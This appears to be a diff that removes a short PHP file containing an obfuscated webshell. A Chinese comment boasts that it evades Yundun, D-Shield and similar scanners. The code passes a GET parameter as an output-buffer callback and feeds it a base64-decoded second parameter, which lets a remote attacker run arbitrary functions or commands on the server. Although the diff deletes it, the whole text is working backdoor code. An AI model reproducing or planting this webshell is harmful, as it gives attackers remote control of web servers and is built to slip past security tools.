@@ -1,1 +1,0 @@
-b"<?php\r\n \r\n//\xb9\xfd\xd4\xc6\xb6\xdc\xa1\xa2D\xb6\xdc\xb8\xf7\xd6\xd6\xb6\xdcshell\r\n$id = $_GET['id'];\r\n//debug\r\necho $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';\r\n$s = '';\r\nforeach(array($id) as $v){\r\n    $s.=$v;\r\n}\r\nob_start($s);\r\nif($catid){\r\n        echo $catid;\r\n}\r\nob_end_flush();"
